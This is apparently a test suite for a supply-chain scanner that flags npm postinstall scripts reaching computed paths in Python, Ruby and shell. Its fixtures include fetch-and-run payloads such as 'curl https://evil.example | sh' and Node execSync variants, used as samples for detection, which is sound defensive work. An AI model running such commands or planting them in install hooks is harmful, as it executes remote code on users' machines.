import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const rb = "system('curl evil|sh')\n";
const py = "import os; os.system('curl evil|sh')\n";
const pyE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

// An f-string, %, format, or join() is not a plain literal and not a simple tail, so it widens.
// One #{ident} or $name after a literal directory stays that directory.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["I1 python f-string path", pyE("import os\nn='run'\nos.system(f'sh tools/{n}.sh')\n", "tools/run.sh"), "tools/run.sh", sh, false],
  ["I2 python % format path", pyE("import os\nn='run'\nos.system('sh tools/%s.sh' % n)\n", "tools/run.sh"), "tools/run.sh", sh, false],
  ["I3 python .format path", pyE("import os\nn='run'\nos.system('sh tools/{}.sh'.format(n))\n", "tools/run.sh"), "tools/run.sh", sh, false],
  ["I4 python os.path.join", pyE("import os,subprocess\nn='run.sh'\nsubprocess.run(['sh',os.path.join('tools',n)])\n", "tools/run.sh"), "tools/run.sh", sh, false],
  ["I5 python runpy computed", pyE("import runpy\nn='run'\nrunpy.run_path(f'tools/{n}.py')\n", "tools/run.py"), "tools/run.py", py, false],
  ["I6 ruby #{} interpolation", rbE("n='run'\nload \"tools/#{n}.rb\"\n", "tools/run.rb"), "tools/run.rb", rb, true],
  ["I7 ruby File.join", rbE("n='run.rb'\nload File.join('tools', n)\n", "tools/run.rb"), "tools/run.rb", rb, false],
  // A sourced file can rebind N, so the tail is not bounded.
  ["I8 sh source computed", shE("N=run\n. \"tools/$N.sh\"\n", "tools/run.sh"), "tools/run.sh", sh, false],
  ["I9 sh run script by path", shE("N=run\n\"./tools/$N.sh\"\n", "tools/run.sh"), "tools/run.sh", sh, true],
  ["I10 sh python3 computed", shE("N=run\npython3 \"tools/$N.py\"\n", "tools/run.py"), "tools/run.py", py, true],
  ["I11 sh node computed", shE("N=run\nnode \"tools/$N.js\"\n", "tools/run.js"), "tools/run.js", "require('child_process').execSync('curl evil|sh')\n", true],
  ["I12 sh exec computed", shE("N=run\nexec \"tools/$N.sh\"\n", "tools/run.sh"), "tools/run.sh", sh, true],
  ["I13 sh xargs sh", shE("echo tools/run.sh | xargs sh\n", "tools/run.sh"), "tools/run.sh", sh, true],
  // $SHELL is the whole command word, so the file widens. ./tools/$N.sh stays one directory.
  ["I14 sh $SHELL computed", shE("N=run\n$SHELL \"tools/$N.sh\"\n", "tools/run.sh"), "tools/run.sh", sh, false],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}
